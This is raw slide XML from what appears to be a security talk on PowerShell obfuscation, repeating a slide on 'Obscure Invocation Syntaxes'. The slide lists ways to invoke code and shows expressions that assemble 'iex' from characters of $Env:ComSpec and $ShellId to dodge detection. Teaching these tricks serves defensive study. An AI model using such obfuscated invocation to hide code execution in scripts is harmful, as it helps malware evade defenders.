              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Expression/IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Alias/GAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Command/GCM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>GetCmdlets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS1.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>InvokeScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS1.0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Command/ICM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>PS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Runspace</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Concatenated IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>AsWorkflow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Dot-Source</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (Disk-based)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Import-Module/IPMO</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> (Disk-based)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Up Arrow 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="5172087" y="3171266"/>
            <a:ext cx="254448" cy="2782406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6613382" y="5775364"/>
            <a:ext cx="46082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http://i0.kym-cdn.com/photos/images/newsfeed/000/995/349/9c9.jpg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6274" y="1315191"/>
            <a:ext cx="4493118" cy="449311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13975" y="3816757"/>
            <a:ext cx="6274050" cy="2246769"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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&amp;(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Env:ComSpec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>[4,26,25]-Join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>''</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ShellId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>[1]+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ShellId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>[13]+'x')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>???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4280388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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Expression/IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Alias/GAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Command/GCM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>GetCmdlets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS1.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>InvokeScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS1.0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Command/ICM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>PS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Runspace</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Concatenated IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>AsWorkflow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Dot-Source</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (Disk-based)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Import-Module/IPMO</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> (Disk-based)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Up Arrow 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="5172087" y="3171266"/>
            <a:ext cx="254448" cy="2782406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6613382" y="5775364"/>
            <a:ext cx="46082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http://i0.kym-cdn.com/photos/images/newsfeed/000/995/349/9c9.jpg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6274" y="1315191"/>
            <a:ext cx="4493118" cy="449311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13975" y="3816757"/>
            <a:ext cx="6274050" cy="2246769"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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&amp;(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Env:ComSpec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>[4,26,25]-Join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>''</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.((LS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>env</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>:/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Co*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>).Value[4,26,25]-Join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ShellId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>[1]+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ShellId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>[13]+'x')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>&amp;( (GV </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>S*ell*d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -V)[1]+(DIR Variable:\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>S*ell*d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>).Value[13]+'x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>???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6189060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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Expression/IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Alias/GAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Command/GCM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>GetCmdlets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS1.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>InvokeScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS1.0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Command/ICM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>PS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Runspace</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Concatenated IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>AsWorkflow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Dot-Source</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (Disk-based)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Import-Module/IPMO</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> (Disk-based)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Up Arrow 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="5172087" y="3171266"/>
            <a:ext cx="254448" cy="2782406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6613382" y="5775364"/>
            <a:ext cx="46082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http://i0.kym-cdn.com/photos/images/newsfeed/000/995/349/9c9.jpg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6274" y="1315191"/>
            <a:ext cx="4493118" cy="449311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13975" y="3816757"/>
            <a:ext cx="6274050" cy="2246769"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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&amp;(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Env:ComSpec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>[4,26,25]-Join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>''</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
